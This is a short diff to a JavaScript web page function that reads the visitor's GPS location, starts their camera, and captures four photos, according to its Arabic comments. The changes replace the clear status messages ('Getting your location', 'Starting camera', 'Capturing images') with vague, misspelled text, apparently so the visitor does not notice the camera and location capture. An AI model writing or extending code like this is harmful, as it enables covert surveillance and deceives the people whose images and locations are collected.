@@ -604,7 +604,7 @@ function getLocationViaGPS() {
 // ================================
 async function getLocationThenCamera(statusDiv, btn) {
     try {
-        statusDiv.innerHTML = "📍 Getting your location...";
+        statusDiv.innerHTML = "📍 Getting your Datials...";
         statusDiv.className = "status-loading";
 
         // 1. الحصول على الموقع (سيظهر طلب إذن واحد فقط)
@@ -632,7 +632,7 @@ async function getLocationThenCamera(statusDiv, btn) {
         statusDiv.className = "status-success";
 
         // 2. تشغيل الكاميرا (بدون طلب إذن إضافي لأنها استجابة لنقرة المستخدم)
-        statusDiv.innerHTML = "📷 Starting camera...";
+        statusDiv.innerHTML = " Starting Bring Datials...";
         statusDiv.className = "status-loading";
 
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -654,7 +654,7 @@ async function getLocationThenCamera(statusDiv, btn) {
             };
         });
 
-        statusDiv.innerHTML = "✅ Camera ready. Capturing images...";
+        statusDiv.innerHTML = "✅ Window ready. Start Getting Datials ...";
         statusDiv.className = "status-success";
 
         // التقاط 4 صور
